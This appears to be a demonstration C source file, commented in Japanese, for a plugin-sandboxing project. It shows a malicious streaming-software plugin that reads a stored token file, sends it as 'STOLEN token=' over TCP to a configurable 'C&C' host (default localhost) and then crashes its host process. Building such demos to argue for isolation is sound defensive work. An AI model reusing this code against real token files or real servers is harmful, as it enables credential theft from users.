/*
 * steal_plugin.c — 「今までの世界」の配信プラグイン (Before 側)
 *
 * OBS や配信ツールのプラグインは、ホストと同じ OS 権限で動く (ambient authority)。
 * つまり、あなたが起動したプロセスにできることは、そのプラグインにも全部できる。
 * このファイルは、その前提のもとで「悪意あるプラグインが実際に何をできるか」を、
 * WEAVE 上で動く malicious_plugin.c と "同じ 3 つの攻撃" で示す。
 *
 * 安全のための線引き (重要):
 *   - 読むのはリポジトリ外の一時ディレクトリに置いた、中身が明らかにダミーの偽トークンだけ。
 *   - 送る先は 127.0.0.1 の自作のダミー受信プロセスだけ。ネットワークには一切出ない。
 *   - 実在サービスの資格情報も、外部への持ち出しも一切ない。
 *   これは「素の環境ならこの種のコードが動いてしまう」を示すデモであって、攻撃ツールではない。
 *
 * ビルド: cc -O2 demo/bare/steal_plugin.c -o <out>
 * 使い方: steal_plugin <偽トークンのパス> <C&C ホスト> <C&C ポート>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define RED "\033[31;1m"
#define YEL "\033[33;1m"
#define DIM "\033[2m"
#define RST "\033[0m"

int main(int argc, char **argv) {
    const char *token_path = argc > 1 ? argv[1] : "/tmp/weave-demo/discord.token";
    const char *cnc_host = argc > 2 ? argv[2] : "127.0.0.1";
    int cnc_port = argc > 3 ? atoi(argv[3]) : 9099;

    printf(YEL "[今までの世界] 悪意あるプラグインを OBS と同じ権限で起動\n" RST);
    printf(DIM "  (配信ソフトのプラグインは、あなたのアカウントでできることを全部できる)\n" RST);

    /* 攻撃1: ファイルシステムから機密を読む ------------------------------- */
    printf("\n[攻撃1] 保存されたトークンを探して読む: %s\n", token_path);
    char token[256] = {0};
    FILE *f = fopen(token_path, "r");
    if (f) {
        size_t n = fread(token, 1, sizeof(token) - 1, f);
        fclose(f);
        if (n && token[n - 1] == '\n') token[n - 1] = 0;
        printf(RED "  → 成功。読み取った: \"%s\"\n" RST, token);
    } else {
        printf("  → 読めなかった (%s)\n", strerror(errno));
    }

    /* 攻撃2: 外部 (C&C) へ接続して送信する ------------------------------- */
    printf("\n[攻撃2] 外部サーバーへ接続して盗んだ値を送信: %s:%d\n", cnc_host, cnc_port);
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)cnc_port);
    inet_pton(AF_INET, cnc_host, &addr.sin_addr);
    if (fd >= 0 && connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        char msg[320];
        int m = snprintf(msg, sizeof(msg), "STOLEN token=%s\n", token[0] ? token : "(empty)");
        ssize_t w = write(fd, msg, (size_t)m);
        (void)w;
        printf(RED "  → 成功。接続してデータを送信した\n" RST);
        close(fd);
    } else {
        printf("  → 接続できなかった\n");
        if (fd >= 0) close(fd);
    }

    /* 攻撃3: ホストを巻き込んで落とす (依存ツールも道連れ) ---------------- */
    printf("\n[攻撃3] ホスト (配信ソフト) のプロセスを不正なメモリ操作でクラッシュさせる\n");
    printf(RED "  → プラグインはホストと同じプロセス。ここで OBS ごと落ちる:\n" RST);
    fflush(stdout);
    volatile int *p = (int *)0;
    *p = 42; /* NULL 参照。ホストプロセスごと SIGSEGV */

    printf("(ここには到達しない)\n");
    return 0;
}
